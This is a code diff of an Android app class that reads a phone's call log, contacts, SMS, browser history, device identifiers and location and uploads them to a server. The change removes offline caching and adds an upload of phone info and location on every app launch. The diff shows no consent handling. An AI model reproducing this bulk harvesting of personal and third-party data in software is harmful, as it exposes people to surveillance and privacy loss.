@@ -36,6 +36,7 @@ import com.zcj.android.web.ServiceResult;
 import com.zcj.util.UtilString;
 
 import java.io.File;
+import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
@@ -123,18 +124,19 @@ public class MyApplication extends Application {
     }
 
     /**
-     * 读取各类信息到本地数据库（读取之前清理以前读取的 通讯录、通话记录、短信 数据），并上传至服务器
+     * 读取各类信息，并上传至服务器
      *
      * @param callRecord 读取通话记录
-     * @param contacts   读取通讯录
+     * @param contacts   读取通讯录(同时用于判断是打开APP时采集数据还是核验时采集数据)
      * @param messages   读取短信
      * @param internet   浏览器历史记录
      * @param phoneInfo  读取手机参数
      * @param location   读取位置信息
      * @param showResult 执行完毕后是否弹出提示
+     * @param handler
      */
-    public void readInfoToDatebaseAndUpload(final boolean callRecord, final boolean contacts, final boolean messages, final boolean internet,
-                                    final boolean phoneInfo, final boolean location, final String showResult, final Handler handler) {
+    public void readInfoAndUploadToWeb(final boolean callRecord, final boolean contacts, final boolean messages, final boolean internet,
+                                       final boolean phoneInfo, final boolean location, final String showResult, final Handler handler) {
 
         MyConfig.log("开始读取手机数据并上传...");
 
@@ -224,7 +226,11 @@ public class MyApplication extends Application {
 
                 MyConfig.log(result);
 
-                uploadInfoToWeb(callRecordList, contactsList, messagesList, pi, loc, internetList);
+                if (contacts) {
+                    uploadInfoToWeb(callRecordList, contactsList, messagesList, pi, loc, internetList);
+                } else {
+                    uploadBaseToWeb(pi, loc);
+                }
 
                 if (UtilString.isNotBlank(showResult) && handler != null) {
                     handler.sendMessage(newMessage(SjhyActivity.MESSAGE_WHAT_ALERTDIALOG, showResult));
@@ -259,9 +265,18 @@ public class MyApplication extends Application {
     }
 
     /**
-     * 上传各类信息到服务器
-     * <p/>
-     * 如果网络(wifi)连接正常，则上传本次获取的数据和本地数据库里的数据；如果连接不正常，则保存到本地数据库等待下次上传。
+     * 上传基本信息到服务器，用于每次打开APP
+     *
+     * @param phoneInfo
+     * @param location
+     */
+    private void uploadBaseToWeb(PhoneInfo phoneInfo, Location location) {
+        uploadPhoneInfoToWeb(phoneInfo);
+        uploadLocationToWeb(location);
+    }
+
+    /**
+     * 上传各类信息到服务器，用于数据采集
      *
      * @param callRecord 通话记录
      * @param contacts   通讯录
@@ -270,299 +285,93 @@ public class MyApplication extends Application {
      * @param location   位置信息
      * @param internet   浏览器历史记录
      */
-    public void uploadInfoToWeb(List<CallRecord> callRecord, List<Contacts> contacts, List<Messages> messages, PhoneInfo phoneInfo,
-                                Location location, List<Internet> internet) {
-        uploadCallRecord(callRecord);
-        uploadContacts(contacts);
-        uploadMessages(messages);
-        uploadInternet(internet);
-        uploadPhoneInfo(phoneInfo);
-        uploadLocation(location);
+    private void uploadInfoToWeb(List<CallRecord> callRecord, List<Contacts> contacts, List<Messages> messages, PhoneInfo phoneInfo,
+                                 Location location, List<Internet> internet) {
+        uploadCallRecordToWeb(callRecord);
+        uploadContactsToWeb(contacts);
+        uploadMessagesToWeb(messages);
+        uploadInternetToWeb(internet);
+        uploadPhoneInfoToWeb(phoneInfo);
+        uploadLocationToWeb(location);
     }
 
-    private void uploadCallRecord(List<CallRecord> cr) {
-        if (UtilAndroid.isWifiConnected(this)) {
-
-            // 上传数据库里的数据
-            try {
-                List<CallRecord> callRecordList = getDbUtils().findAll(CallRecord.class);
-                uploadCallRecordToWeb(callRecordList, false);
-            } catch (DbException e) {
-                e.printStackTrace();
-            }
-
-            // 上传本次获取的数据
-            if (cr != null && cr.size() > 0) {
-                uploadCallRecordToWeb(cr, true);
-            }
-
-        } else {
-            saveCallRecordToDb(cr);
-        }
-    }
-
-    private void saveCallRecordToDb(List<CallRecord> cr) {
-        if (cr != null && cr.size() > 0) {
-            MyConfig.log("准备保存" + cr.size() + "条通话记录到本地...");
-            try {
-                getDbUtils().saveBindingIdAll(cr);
-                MyConfig.log("通话记录保存本地数据库成功");
-            } catch (DbException e) {
-                e.printStackTrace();
-                MyConfig.log("通话记录保存本地数据库失败");
-            }
-        }
-    }
-
-    private void uploadCallRecordToWeb(final List<CallRecord> callRecordList, final boolean errorSaveToDb) {
+    private void uploadCallRecordToWeb(final List<CallRecord> callRecordList) {
         if (callRecordList != null && callRecordList.size() > 0) {
             MyConfig.log("准备上传" + callRecordList.size() + "条通话记录");
             String crJson = ServiceResult.GSON_DT.toJson(callRecordList);
             HttpUtilsHandler.send(HttpUrlUtil.URL_SAVECALLRECORD, HttpUrlUtil.url_saveOther(phoneId, crJson), new HttpCallback() {
                 @Override
                 public void success(String result) {
-                    try {
-                        getDbUtils().deleteAll(CallRecord.class);
-                        MyConfig.log("上传通话记录成功，删除本地数据成功");
-                    } catch (DbException e) {
-                        e.printStackTrace();
-                        MyConfig.log("上传通话记录成功，删除本地数据失败");
-                    }
+                    MyConfig.log("上传通话记录成功");
                 }
 
                 @Override
                 public void error() {
                     MyConfig.log("上传通话记录失败");
-                    if (errorSaveToDb) {
-                        saveCallRecordToDb(callRecordList);
-                    }
                 }
             });
         }
     }
 
-    private void uploadContacts(List<Contacts> cr) {
-        if (UtilAndroid.isWifiConnected(this)) {
-
-            // 上传数据库里的数据
-            try {
-                List<Contacts> list = getDbUtils().findAll(Contacts.class);
-                uploadContactsToWeb(list, false);
-            } catch (DbException e) {
-                e.printStackTrace();
-            }
-
-            // 上传本次获取的数据
-            if (cr != null && cr.size() > 0) {
-                uploadContactsToWeb(cr, true);
-            }
-
-        } else {
-            saveContactsToDb(cr);
+    /**
+     * 不管有没有数据，都发HTTP请求，请求失败的话不需要做任何处理
+     */
+    private void uploadContactsToWeb(List<Contacts> list) {
+        if (list == null) {
+            list = new ArrayList<>();
         }
+        MyConfig.log("准备上传" + list.size() + "条通讯录");
+        String crJson = ServiceResult.GSON_DT.toJson(list);
+        HttpUtilsHandler.send(HttpUrlUtil.URL_SAVECONTACTS, HttpUrlUtil.url_saveOther(phoneId, crJson), new HttpCallback() {
+            @Override
+            public void success(String result) {
+                MyConfig.log("上传通讯录成功");
+            }
+
+            @Override
+            public void error() {
+                MyConfig.log("上传通讯录失败");
+            }
+        });
     }
 
-    private void saveContactsToDb(List<Contacts> cr) {
-        if (cr != null && cr.size() > 0) {
-            MyConfig.log("准备保存" + cr.size() + "条通讯录到本地...");
-            try {
-                getDbUtils().saveBindingIdAll(cr);
-                MyConfig.log("通讯录保存本地数据库成功");
-            } catch (DbException e) {
-                e.printStackTrace();
-                MyConfig.log("通讯录保存本地数据库失败");
-            }
-        }
-    }
-
-    private void uploadContactsToWeb(final List<Contacts> list, final boolean errorSaveToDb) {
-        if (list != null && list.size() > 0) {
-            MyConfig.log("准备上传" + list.size() + "条通讯录");
-            String crJson = ServiceResult.GSON_DT.toJson(list);
-            HttpUtilsHandler.send(HttpUrlUtil.URL_SAVECONTACTS, HttpUrlUtil.url_saveOther(phoneId, crJson), new HttpCallback() {
-                @Override
-                public void success(String result) {
-                    try {
-                        getDbUtils().deleteAll(Contacts.class);
-                        MyConfig.log("上传通讯录成功，删除本地数据成功");
-                    } catch (DbException e) {
-                        e.printStackTrace();
-                        MyConfig.log("上传通讯录成功，删除本地数据失败");
-                    }
-                }
-
-                @Override
-                public void error() {
-                    MyConfig.log("上传通讯录失败");
-                    if (errorSaveToDb) {
-                        saveContactsToDb(list);
-                    }
-                }
-            });
-        }
-    }
-
-    private void uploadMessages(List<Messages> cr) {
-        if (UtilAndroid.isWifiConnected(this)) {
-
-            // 上传数据库里的数据
-            try {
-                List<Messages> list = getDbUtils().findAll(Messages.class);
-                uploadMessagesToWeb(list, false);
-            } catch (DbException e) {
-                e.printStackTrace();
-            }
-
-            // 上传本次获取的数据
-            if (cr != null && cr.size() > 0) {
-                uploadMessagesToWeb(cr, true);
-            }
-
-        } else {
-            saveMessagesToDb(cr);
-        }
-    }
-
-    private void saveMessagesToDb(List<Messages> cr) {
-        if (cr != null && cr.size() > 0) {
-            MyConfig.log("准备保存" + cr.size() + "条短信到本地...");
-            try {
-                getDbUtils().saveBindingIdAll(cr);
-                MyConfig.log("短信保存本地数据库成功");
-            } catch (DbException e) {
-                e.printStackTrace();
-                MyConfig.log("短信保存本地数据库失败");
-            }
-        }
-    }
-
-    private void uploadMessagesToWeb(final List<Messages> list, final boolean errorSaveToDb) {
+    private void uploadMessagesToWeb(final List<Messages> list) {
         if (list != null && list.size() > 0) {
             MyConfig.log("准备上传" + list.size() + "条短信");
             String crJson = ServiceResult.GSON_DT.toJson(list);
             HttpUtilsHandler.send(HttpUrlUtil.URL_SAVEMESSAGES, HttpUrlUtil.url_saveOther(phoneId, crJson), new HttpCallback() {
                 @Override
                 public void success(String result) {
-                    try {
-                        getDbUtils().deleteAll(Messages.class);
-                        MyConfig.log("上传短信成功，删除本地数据成功");
-                    } catch (DbException e) {
-                        e.printStackTrace();
-                        MyConfig.log("上传短信成功，删除本地数据失败");
-                    }
+                    MyConfig.log("上传短信成功");
                 }
 
                 @Override
                 public void error() {
                     MyConfig.log("上传短信失败");
-                    if (errorSaveToDb) {
-                        saveMessagesToDb(list);
-                    }
                 }
             });
         }
     }
 
-    private void uploadInternet(List<Internet> cr) {
-        if (UtilAndroid.isWifiConnected(this)) {
-
-            // 上传数据库里的数据
-            try {
-                List<Internet> list = getDbUtils().findAll(Internet.class);
-                uploadInternetToWeb(list, false);
-            } catch (DbException e) {
-                e.printStackTrace();
-            }
-
-            // 上传本次获取的数据
-            if (cr != null && cr.size() > 0) {
-                uploadInternetToWeb(cr, true);
-            }
-
-        } else {
-            saveInternetToDb(cr);
-        }
-    }
-
-    private void saveInternetToDb(List<Internet> cr) {
-        if (cr != null && cr.size() > 0) {
-            MyConfig.log("准备保存" + cr.size() + "条浏览器记录到本地...");
-            try {
-                getDbUtils().saveBindingIdAll(cr);
-                MyConfig.log("浏览器记录保存本地数据库成功");
-            } catch (DbException e) {
-                e.printStackTrace();
-                MyConfig.log("浏览器记录保存本地数据库失败");
-            }
-        }
-    }
-
-    private void uploadInternetToWeb(final List<Internet> list, final boolean errorSaveToDb) {
+    private void uploadInternetToWeb(final List<Internet> list) {
         if (list != null && list.size() > 0) {
             MyConfig.log("准备上传" + list.size() + "条浏览器记录");
             String crJson = ServiceResult.GSON_DT.toJson(list);
             HttpUtilsHandler.send(HttpUrlUtil.URL_SAVEINTERNET, HttpUrlUtil.url_saveOther(phoneId, crJson), new HttpCallback() {
                 @Override
                 public void success(String result) {
-                    try {
-                        getDbUtils().deleteAll(Internet.class);
-                        MyConfig.log("上传浏览器记录成功，删除本地数据成功");
-                    } catch (DbException e) {
-                        e.printStackTrace();
-                        MyConfig.log("上传浏览器记录成功，删除本地数据失败");
-                    }
+                    MyConfig.log("上传浏览器记录成功");
                 }
 
                 @Override
                 public void error() {
                     MyConfig.log("上传浏览器记录失败");
-                    if (errorSaveToDb) {
-                        saveInternetToDb(list);
-                    }
                 }
             });
         }
     }
 
-    private void uploadPhoneInfo(PhoneInfo cr) {
-        if (UtilAndroid.isNetworkConnected(this)) {
-
-            // 上传数据库里的数据
-            try {
-                List<PhoneInfo> list = getDbUtils().findAll(PhoneInfo.class);
-                if (list != null && list.size() > 0) {
-                    for (PhoneInfo l : list) {
-                        uploadPhoneInfoToWeb(l, false);
-                    }
-                }
-            } catch (DbException e) {
-                e.printStackTrace();
-            }
-
-            // 上传本次获取的数据
-            if (cr != null) {
-                uploadPhoneInfoToWeb(cr, true);
-            }
-
-        } else {
-            savePhoneInfoToDb(cr);
-        }
-    }
-
-    private void savePhoneInfoToDb(PhoneInfo cr) {
-        if (cr != null) {
-            MyConfig.log("准备保存手机参数到本地...");
-            try {
-                getDbUtils().saveBindingId(cr);
-                MyConfig.log("手机参数保存本地数据库成功");
-            } catch (DbException e) {
-                e.printStackTrace();
-                MyConfig.log("手机参数保存本地数据库失败");
-            }
-        }
-    }
-
-    private void uploadPhoneInfoToWeb(final PhoneInfo obj, final boolean errorSaveToDb) {
+    private void uploadPhoneInfoToWeb(final PhoneInfo obj) {
         if (obj != null) {
             MyConfig.log("准备上传手机参数");
             HttpUtilsHandler.send(
@@ -571,67 +380,18 @@ public class MyApplication extends Application {
                             obj.getImsi(), obj.getBluetoothMacAddress()), new HttpCallback() {
                         @Override
                         public void success(String result) {
-                            try {
-                                if (obj.getId() != null) {
-                                    getDbUtils().deleteById(PhoneInfo.class, obj.getId());
-                                }
-                                MyConfig.log("上传手机参数成功，删除本地数据成功");
-                            } catch (DbException e) {
-                                e.printStackTrace();
-                                MyConfig.log("上传手机参数成功，删除本地数据失败");
-                            }
+                            MyConfig.log("上传手机参数成功");
                         }
 
                         @Override
                         public void error() {
                             MyConfig.log("上传手机参数失败");
-                            if (errorSaveToDb) {
-                                savePhoneInfoToDb(obj);
-                            }
                         }
                     });
         }
     }
 
-    public void uploadLocation(Location cr) {
-        if (UtilAndroid.isNetworkConnected(this)) {
-
-            // 上传数据库里的数据
-            try {
-                List<Location> list = getDbUtils().findAll(Location.class);
-                if (list != null && list.size() > 0) {
-                    for (Location l : list) {
-                        uploadLocationToWeb(l, false);
-                    }
-                }
-            } catch (DbException e) {
-                e.printStackTrace();
-            }
-
-            // 上传本次获取的数据
-            if (cr != null) {
-                uploadLocationToWeb(cr, true);
-            }
-
-        } else {
-            saveLocationToDb(cr);
-        }
-    }
-
-    private void saveLocationToDb(Location cr) {
-        if (cr != null) {
-            MyConfig.log("准备保存位置信息到本地...");
-            try {
-                getDbUtils().saveBindingId(cr);
-                MyConfig.log("位置信息保存本地数据库成功");
-            } catch (DbException e) {
-                e.printStackTrace();
-                MyConfig.log("位置信息保存本地数据库失败");
-            }
-        }
-    }
-
-    private void uploadLocationToWeb(final Location obj, final boolean errorSaveToDb) {
+    private void uploadLocationToWeb(final Location obj) {
         if (obj != null) {
             MyConfig.log("准备上传位置信息");
             HttpUtilsHandler.send(HttpUrlUtil.URL_SAVELOCATION,
@@ -639,23 +399,12 @@ public class MyApplication extends Application {
                     new HttpCallback() {
                         @Override
                         public void success(String result) {
-                            try {
-                                if (obj.getId() != null) {
-                                    getDbUtils().deleteById(Location.class, obj.getId());
-                                }
-                                MyConfig.log("上传位置信息成功，删除本地数据成功");
-                            } catch (DbException e) {
-                                e.printStackTrace();
-                                MyConfig.log("上传位置信息成功，删除本地数据失败");
-                            }
+                            MyConfig.log("上传位置信息成功");
                         }
 
                         @Override
                         public void error() {
                             MyConfig.log("上传位置信息失败");
-                            if (errorSaveToDb) {
-                                saveLocationToDb(obj);
-                            }
                         }
                     });
         }
